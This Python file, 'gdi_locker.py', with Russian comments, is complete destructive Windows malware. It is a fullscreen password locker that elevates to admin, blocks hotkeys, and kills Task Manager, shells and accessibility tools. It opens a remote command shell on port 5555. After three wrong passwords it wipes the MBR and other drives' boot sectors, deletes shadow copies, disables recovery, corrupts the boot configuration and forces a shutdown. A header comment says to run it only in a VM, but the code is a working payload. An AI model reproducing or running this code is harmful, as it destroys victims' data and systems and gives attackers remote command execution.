# language: Python, file: gdi_locker.py
# Зависимости: pillow keyboard psutil pygame
# ВНИМАНИЕ: 3 неверная попытка = GDI-закручивание -> No Signal -> MBR wipe + BCD wipe + shutdown.
# Запускать ТОЛЬКО в VM со снапшотом.

import ctypes
import hashlib
import os
import string
import subprocess
import sys
import threading
import time
import socket
import random
from ctypes import wintypes
import psutil

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

import tkinter as tk
from PIL import Image, ImageTk, ImageGrab, ImageEnhance, ImageDraw

# ================= НАСТРОЙКИ =================
_SALT = b"QackLockerSalt_2026"
CORRECT_HASH = hashlib.sha256(_SALT + b"8841").hexdigest()
C2_PORT = 5555

BLOCK_EXE = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "mmc.exe",
    "osk.exe", "utilman.exe", "magnify.exe", "narrator.exe", "atbroker.exe"
}

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
kernel32.WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
kernel32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong, ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]

# ================= СИСТЕМНЫЕ ФУНКЦИИ =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception:
        pass
    sys.exit(0)

def wipe_mbr() -> bool:
    h = kernel32.CreateFileW(r"\\.\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
    if h == INVALID_HANDLE_VALUE:
        return False
    try:
        written = wintypes.DWORD(0)
        junk = bytearray(os.urandom(512))
        junk[510] = 0x00
        junk[511] = 0x00
        kernel32.WriteFile(h, bytes(junk), 512, ctypes.byref(written), None)
        kernel32.FlushFileBuffers(h)
        filler = b"\xFF" * 4096
        kernel32.SetFilePointerEx(h, ctypes.c_longlong(512), None, 0)
        kernel32.WriteFile(h, filler, len(filler), ctypes.byref(written), None)
        kernel32.FlushFileBuffers(h)
        length = ctypes.c_ulonglong(0)
        ret = wintypes.DWORD(0)
        kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO, None, 0, ctypes.byref(length), 8, ctypes.byref(ret), None)
        if length.value > 1024:
            last = length.value - 512
            kernel32.SetFilePointerEx(h, ctypes.c_longlong(last), None, 0)
            kernel32.WriteFile(h, b"\xFF" * 512, 512, ctypes.byref(written), None)
            kernel32.FlushFileBuffers(h)
        return True
    finally:
        kernel32.CloseHandle(h)

def wipe_ntfs_boot_sectors():
    system_drive = os.environ.get("SystemDrive", "C:").rstrip("\\").upper()
    for letter in string.ascii_uppercase:
        drive = f"{letter}:"
        if drive == system_drive or not os.path.exists(f"{drive}\\"):
            continue
        try:
            h = kernel32.CreateFileW(f"\\\\.\\{drive}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
            if h == INVALID_HANDLE_VALUE:
                continue
            written = wintypes.DWORD(0)
            kernel32.WriteFile(h, os.urandom(512), 512, ctypes.byref(written), None)
            kernel32.FlushFileBuffers(h)
            kernel32.CloseHandle(h)
        except Exception:
            pass

def destroy_boot_and_recovery():
    subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, creationflags=0x08000000)
    subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
    subprocess.run(["bcdedit", "/delete", "{default}", "/f"], capture_output=True, creationflags=0x08000000)
    subprocess.run(["bcdedit", "/set", "{bootmgr}", "path", "\\NONEXISTENT"], capture_output=True, creationflags=0x08000000)

def kill_blocked():
    while True:
        for proc in psutil.process_iter(["name"]):
            try:
                if (proc.info["name"] or "").lower() in BLOCK_EXE:
                    proc.kill()
            except Exception:
                pass
        time.sleep(0.2)

def install_blocks():
    if HAS_KEYBOARD:
        try:
            keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
            keyboard.block_key('win')
        except Exception:
            pass

# ================= C2 СЕРВЕР =================
def c2_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", C2_PORT))
        server.listen(5)
    except Exception:
        return

    while True:
        try:
            client, addr = server.accept()
            client.send(b"--- QACK C2 SHELL ---\n> ")
            while True:
                data = client.recv(1024)
                if not data: break
                cmd = data.decode('utf-8', errors='ignore').strip()
                if cmd.lower() == "exit": break
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    out = result.stdout + result.stderr
                    if not out: out = "[OK]"
                except Exception as e:
                    out = f"Error: {e}"
                client.send((out + "\n> ").encode('utf-8'))
            client.close()
        except Exception:
            pass

# ================= GDI ЭФФЕКТ (ЗАКРУЧИВАНИЕ) =================
class GDIChaos:
    def __init__(self, root, on_finish):
        self.root = root
        self.on_finish = on_finish
        self.root.title("GDI_LOCKER")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()
        
        # Делаем скриншот рабочего стола
        try:
            self.bg_img = ImageGrab.grab(all_screens=True)
        except Exception:
            self.bg_img = Image.new("RGB", (self.width, self.height), "black")
        
        self.canvas = tk.Canvas(root, width=self.width, height=self.height, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        # Готовим глючную картинку
        self.glitch_pil = self.make_glitch_image()
        self.glitch_img_tk = ImageTk.PhotoImage(self.glitch_pil)
        self.bg_item = self.canvas.create_image(0, 0, image=self.glitch_img_tk, anchor="nw")
        
        self.cross_img = self.make_cross_image()
        self.active_crosses = []
        
        self.start_time = time.time()
        self.animate()

    def make_glitch_image(self):
        try:
            img = self.bg_img.resize((self.width, self.height)).convert("RGB")
        except Exception:
            img = Image.new("RGB", (self.width, self.height), "black")

        draw_glitch = Image.new("RGB", (self.width, self.height), "black")
        pixels = draw_glitch.load()
        for x in range(0, self.width, 4):
            for y in range(0, self.height, 4):
                if random.random() > 0.7:
                    pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                    
        result = Image.blend(img, draw_glitch, alpha=0.4)
        enhancer = ImageEnhance.Color(result)
        result = enhancer.enhance(2.5)
        return result

    def make_cross_image(self):
        cross_size = 32
        cross = Image.new("RGBA", (cross_size, cross_size), (0, 0, 0, 0))
        draw = ImageDraw.Draw(cross)
        draw.ellipse((0, 0, cross_size - 1, cross_size - 1), fill="#dc3545", outline="#ff0000", width=2)
        offset = 10
        draw.line((offset, offset, cross_size - offset, cross_size - offset), fill="white", width=3)
        draw.line((offset, cross_size - offset, cross_size - offset, offset), fill="white", width=3)
        return ImageTk.PhotoImage(cross)

    def spawn_cross(self):
        # Крестики спавнятся строго в центре и накладываются друг на друга
        x = self.width // 2
        y = self.height // 2
        item_id = self.canvas.create_image(x, y, image=self.cross_img, anchor="center")
        self.canvas.tag_raise(item_id)  # Поверх фона
        self.active_crosses.append({"id": item_id, "x": x, "y": y})

    def animate(self):
        elapsed = time.time() - self.start_time
        
        # 1. Закручивание в точку (первые 5 секунд)
        if elapsed < 5:
            zoom_factor = max(0.01, 1.0 - (elapsed / 5.0))
            new_w = int(self.width * zoom_factor)
            new_h = int(self.height * zoom_factor)
            
            if new_w > 1 and new_h > 1:
                # Ресайзим картинку через PIL
                resized_pil = self.glitch_pil.resize((new_w, new_h))
                self.current_tk = ImageTk.PhotoImage(resized_pil)
                
                # Центрируем
                x_pos = (self.width - new_w) // 2
                y_pos = (self.height - new_h) // 2
                self.canvas.itemconfig(self.bg_item, image=self.current_tk)
                self.canvas.coords(self.bg_item, x_pos, y_pos)
                
                # Тряска
                x_offset = random.randint(-5, 5)
                y_offset = random.randint(-5, 5)
                self.canvas.move(self.bg_item, x_offset, y_offset)
                
        # 2. No Signal (следующие 5 секунд)
        elif elapsed < 10:
            self.canvas.delete(self.bg_item)
            if not self.canvas.find_withtag("nosignal"):
                self.canvas.create_text(self.width//2, self.height//2, text="NO SIGNAL", fill="white", font=("Consolas", 60, "bold"), tags="nosignal")
            
        # 3. Уничтожение (после 10 секунд)
        else:
            self.canvas.delete("all")
            self.canvas.create_text(self.width//2, self.height//2, text="СИСТЕМА УНИЧТОЖЕНА", fill="red", font=("Impact", 50, "bold"))
            self.on_finish()
            return 
            
        # Спавним крестики
        if int(elapsed * 30) % 5 == 0 and len(self.active_crosses) < 50:
            self.spawn_cross()
            
        self.root.after(33, self.animate)

# ================= ГЛАВНЫЙ КЛАСС =================
def main():
    ensure_admin()
    install_blocks()
    threading.Thread(target=c2_server, daemon=True).start()
    threading.Thread(target=kill_blocked, daemon=True).start()

    win = tk.Tk()
    win.title("System Locker")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!", fg="#FF0000", bg="#000000", font=("Consolas", 24, "bold")).pack(pady=(100, 20))
    tk.Label(win, text="ВВОДИТЕ ПАРОЛЬ АККУРАТНО. 3 ОШИБКИ = УНИЧТОЖЕНИЕ СИСТЕМЫ.", fg="#AAAAAA", bg="#000000", font=("Consolas", 14)).pack(pady=20)

    entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF", font=("Consolas", 20), justify="center", width=20)
    entry.pack(pady=10)

    attempts = 0
    result = tk.Label(win, text="Попыток осталось: 3", fg="#FF0000", bg="#000000", font=("Consolas", 14))
    result.pack(pady=10)

    def on_finish():
        wipe_mbr()
        wipe_ntfs_boot_sectors()
        destroy_boot_and_recovery()
        subprocess.Popen(["shutdown", "/s", "/t", "5", "/f"], creationflags=0x08000000)

    def check_code():
        nonlocal attempts
        h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
        if h == CORRECT_HASH:
            result.config(text="Код правильный!", fg="#00FF00")
            try:
                subprocess.Popen(["explorer.exe"], creationflags=0x08000000)
            except Exception:
                pass
            win.after(1000, win.destroy)
            return
        
        attempts += 1
        entry.delete(0, tk.END)
        left = 3 - attempts
        
        if left == 2:
            result.config(text="ОШИБКА! ОСТАЛОСЬ 2 ПОПЫТКИ!", fg="#FF0000")
        elif left == 1:
            result.config(text="ОШИБКА! ПОСЛЕДНЯЯ ПОПЫТКА!", fg="#FF0000")
        else:
            win.withdraw()
            root_chaos = tk.Toplevel(win)
            GDIChaos(root_chaos, on_finish)

    tk.Button(win, text="ПРОВЕРИТЬ", command=check_code, bg="#222222", fg="#FFFFFF", font=("Consolas", 14), bd=0, padx=20, pady=10).pack(pady=10)
    entry.focus()
    win.mainloop()

if __name__ == "__main__":
    main()
